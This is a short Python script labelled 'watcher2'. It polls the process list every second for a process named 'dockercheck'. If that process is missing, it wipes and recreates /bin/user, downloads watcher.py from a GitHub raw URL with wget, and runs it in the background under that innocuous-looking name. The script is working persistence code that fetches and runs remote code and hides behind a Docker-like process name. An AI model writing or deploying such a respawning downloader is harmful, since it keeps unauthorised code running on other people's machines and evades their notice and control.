#watcher2
import os
import time

while True:
    os.system("ps aux > /tmp/buibdbuyyu8282387")
    if 'dockercheck' in open('/tmp/buibdbuyyu8282387').read():
        #print "true"
        os.system("rm /tmp/buibdbuyyu8282387")
        pass
    else:
        os.system("rm -rf /bin/user/dockercheck")
        os.system("mkdir /bin/user")
        os.system("wget -O /bin/user/dockercheck https://raw.githubusercontent.com/shad0wghost/mylinuxnow/master/watcher.py")
        os.system("python /bin/user/dockercheck &")
        os.system("rm /tmp/buibdbuyyu8282387")
    time.sleep(1)
    
